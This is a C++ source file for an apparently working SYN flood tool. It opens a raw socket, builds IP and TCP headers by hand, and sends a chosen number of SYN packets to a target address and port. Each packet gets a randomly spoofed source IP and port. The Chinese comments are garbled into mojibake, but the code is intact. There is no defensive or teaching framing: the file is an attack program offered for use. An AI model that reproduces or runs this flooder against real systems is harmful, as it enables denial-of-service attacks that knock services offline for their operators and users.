#include <iostream>
#include <sys/socket.h>     // for socket
#include <sys/types.h>      // for socket
#include <netinet/in.h>     // for sockaddr_in
#include <netinet/tcp.h>    // for tcp
#include <netinet/ip.h>     // for ip
#include <arpa/inet.h>      // for inet_
#include <net/if.h>         // for ifreq
#include <memory.h>         // for memset
#include <unistd.h>         // for usleep

using namespace std;

u_int16_t check_sum(u_int16_t *buffer, int size)
{
    //���齫��������Ĵ���, ��ߴ���Ч��.
    register int len = size;
    //16bit
    register u_int16_t *p = buffer;
    //32bit
    register u_int32_t sum = 0;

    //16bit���
    while( len >= 2)
    {
        sum += *(p++)&0x0000ffff;
        len -= 2;
    }

    //���ĵ��ֽ�ֱ�����
    if( len == 1){
        sum += *((u_int8_t *)p);
    }

    //��16bit���16bit���, ֱ����16bitΪ0
    while((sum&0xffff0000) != 0){
        sum = (sum>>16) + (sum&0x0000ffff);
    }
    return (u_int16_t)(~sum);
}

int main(int argc,char *argv[])
{
    if(argc!=4){
        cout << "error args,you should input: sudo ./synFlood [src_addr] [src_port] [attack_num]" << endl;
        return 0;
    }

    //Ŀ���ַ
    string ip_addr = argv[1];

    //Ŀ��˿�
    int port = atoi(argv[2]);

    //��������
    unsigned int attack_num = atoi(argv[3]);

    srandom(time(nullptr));

    // �����Է���ַ��Ϣ
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
    addr.sin_port = htons(port);

    // ����ԭʼ�׽���,TCP
    int socket_fd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(socket_fd<0){
        perror("socket:");
        return 0;
    }
    cout << "sock:" << socket_fd  << endl;

    // ��ֹ�Զ�������ݰ�
    int on = 1;
    int opt =  setsockopt(socket_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    if(opt<0){
        perror("opt:");
        return 0;
    }

    // �������ݱ�buffer(IP�ײ�+TCP�ײ�+TCP���ݲ���)
    unsigned int len = sizeof(struct ip)+sizeof(struct tcphdr);
    unsigned char buffer[len];
    memset(&buffer,0,sizeof(buffer));
    cout << "buffer size :" << len << endl;

    // ����IP�ײ���TCP�ײ�
    struct ip *ip;
    struct tcphdr *tcp;
    ip = (struct ip *)buffer;
    tcp = (struct tcphdr *)(buffer+sizeof(struct ip));//ip�ײ��������tcp���Ķ���

    /*��װip�ײ�*/
    // �汾 4
    ip->ip_v = IPVERSION;
    // �ײ����� 4
    ip->ip_hl = sizeof(struct ip)>>2;
    // ��������(types of service) 8
    ip->ip_tos = 0;
    // �ܳ��� 16
    ip->ip_len = htons(len);
    // ��ʶ 16
    ip->ip_id = 0;
    // ��־+ƫ�� 16
    ip->ip_off = 0;
    // ����ʱ�� 8
    ip->ip_ttl = 0;
    // Э�� 8
    ip->ip_p = IPPROTO_TCP;
    // �ײ������ 16
    ip->ip_sum = 0;
    // Դ��ַ(��α��) 32
    //ip->ip_src.s_addr = inet_addr("127.0.0.1");
    // Ŀ�ĵ�ַ 32
    ip->ip_dst = addr.sin_addr;

    /*��װtcp�ײ�*/
    // Դ�˿� 16 , ��syn�����������α��˿�
    //tcp->source = htons(m_port);
    // Ŀ�Ķ˿� 16
    tcp->dest = addr.sin_port;
    // ��� 32
    tcp->seq = 0;
    // ȷ�Ϻ� 32
    tcp->ack_seq = 0;
    // ����ƫ�� 4
    //tcp->res1 = 0;
    // ���� 4
    tcp->doff = 5;  // �����wireshark������ָ��������ƫ�ƣ�resl��doff��λ�÷��ˣ���֪����ͷ�ļ������⻹��ʲô�ģ�Ӧ�ò��Ǵ�С�����⡣
    //res2+urg+ack+psh+rst+syn+fin 8
    //tcp->res2 = 0;
    //tcp->urg = 0;
    //tcp->ack = 0;
    //tcp->psh = 0;
    //tcp->rst = 0;
    tcp->syn = 1;
    //tcp->fin = 0;
    // ���� 16
    //tcp->window = 0;
    // ����� 16
    tcp->check = 0;
    // ����ָ�� 16
    //tcp->urg_ptr = 0;

    /*synFlood*/
    for(unsigned int i = 0 ; i < attack_num ; i++){
        // α��ipԴ��ַ
        u_int32_t m_ip = random();
        ip->ip_src.s_addr = htonl(m_ip);

        // α��tcpԴ�˿�
        tcp->source = htons(random());

        cout << "[α����Ϣ]ip:" << inet_ntoa(ip->ip_src) << " port:" << tcp->source << endl;

        /*����tcpУ���*/
        ip->ip_ttl = 0;
        tcp->check = 0;

        // ip�ײ���У��ͣ��ں˻��Զ����㣬������Ϊα�ײ������tcp����
        ip->ip_sum = htons(sizeof(struct tcphdr));

        // ����tcpУ��ͣ���α�ײ���ʼ
        tcp->check = check_sum((u_int16_t *)buffer+4,sizeof(buffer)-8);

        ip->ip_ttl = MAXTTL;
        // ����
        int res =  sendto(socket_fd,buffer,len,0,(sockaddr *)&addr,sizeof(struct sockaddr_in)) ;
        cout << res << endl;
        if(res<0){
            perror("res");
            return 0;
        }
        usleep(10000);
    }
    cout << "done." << endl;
    return 0;
}